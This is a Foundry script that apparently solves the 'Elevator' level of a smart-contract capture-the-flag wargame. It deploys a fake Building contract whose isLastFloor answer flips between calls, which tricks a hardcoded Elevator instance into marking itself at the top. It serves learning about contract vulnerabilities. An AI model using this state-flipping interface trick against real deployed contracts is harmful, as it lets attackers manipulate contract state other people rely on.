// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/11-Elevator/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ImplBuilding is Building{
    Elevator elevatorInstance;
    uint256 floor;

    constructor(Elevator _elevatorInstance, uint256 _floor) {
        elevatorInstance= _elevatorInstance;
        floor = _floor;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if(_floor == floor){
            return true;
        }
        else{
            floor = _floor;
            return false;
        }
    }

    function goTo(uint256 _floor) public {
        elevatorInstance.goTo(_floor);
    }
}

contract Level11Solution is Script {
    Elevator elevatorInstance = Elevator((0x63Dd51e2dD62708D0Fb30ed582eED88C7E57927B));

    function run() external {
        vm.startBroadcast();
        console.log("top, ", elevatorInstance.top());

        // a building with 1 floor
        ImplBuilding implBuilding = new ImplBuilding(elevatorInstance, 1);

        implBuilding.goTo(3);

        console.log("top, ", elevatorInstance.top());

        vm.stopBroadcast();
    }
}